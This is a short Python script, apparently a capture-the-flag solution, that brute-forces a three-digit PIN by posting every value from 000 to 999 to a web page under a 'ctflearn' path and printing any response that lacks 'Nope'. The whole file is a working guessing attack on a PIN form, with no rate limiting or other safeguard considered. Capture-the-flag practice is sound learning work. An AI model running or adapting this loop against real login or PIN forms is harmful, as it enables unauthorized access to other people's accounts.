import requests
payload = {'pin':'000'}
pins = []
for i in range(10):
    for j in range(10):
        for k in range(10):
            pins.append(str(i) + str(j) + str(k))

for i in pins:
    payload['pin'] = i
    r = requests.post('http://jameslepone.com/ctflearn/', payload)
    if not "Nope" in r.text:
        print(r.text)
        print(i)
    else:
        print(i)
